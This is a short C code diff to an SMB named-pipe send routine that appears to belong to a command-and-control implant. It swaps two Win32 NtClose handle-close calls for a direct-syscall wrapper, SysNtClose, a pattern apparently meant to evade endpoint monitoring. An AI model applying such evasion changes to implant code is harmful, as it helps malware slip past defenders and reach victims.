@@ -36,7 +36,7 @@ BOOL SmbSend( PBUFFER Send )
 
         if ( ! Instance.Win32.ConnectNamedPipe( Instance.Config.Transport.Handle, NULL ) )
         {
-            Instance.Win32.NtClose( Instance.Config.Transport.Handle );
+            SysNtClose( Instance.Config.Transport.Handle );
             return FALSE;
         }
 
@@ -53,7 +53,7 @@ BOOL SmbSend( PBUFFER Send )
         {
             if ( Instance.Config.Transport.Handle )
             {
-                Instance.Win32.NtClose( Instance.Config.Transport.Handle );
+                SysNtClose( Instance.Config.Transport.Handle );
                 Instance.Config.Transport.Handle = NULL;
             }
 
